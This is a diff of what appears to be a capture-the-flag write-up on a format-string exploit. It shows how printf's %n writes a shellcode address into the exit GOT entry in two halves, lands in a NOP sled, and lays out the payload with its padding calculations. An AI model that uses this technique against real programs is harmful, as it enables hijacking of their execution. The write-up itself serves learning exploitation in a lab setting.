@@ -67,15 +67,17 @@ PAYLOAD address: 0xffffdf15
 ```
 we need to put the address of our shellcode instead of the exit address in the got
 we will use $n of printf to write the right amount of byte (shellcode adr) in the exit got adr
-since our shellcode adr is very big we will write it in two time and increment the shellcode
+since our shellcode adr is very big (0xffffdf15 = 4294958869 in decimal)we will write it in two time and increment the shellcode
 adr a bit so we end up in the nop sled
+
+PAYLOAD = `shellcode adr` + `shellcode adr+2` + `0xdf31(dec)` + %10$n + `(0xffff - 0xdf31)dec` + %11$n
 
 ```sh
 >>> 0xdf15
 57109
 >>> hex(57137)
 '0xdf31'
->>> 0xffff
+>>> 0xffff              #here we increment the result to get in the nop sled
 65535
 >>> 65535 - 57109
 8426
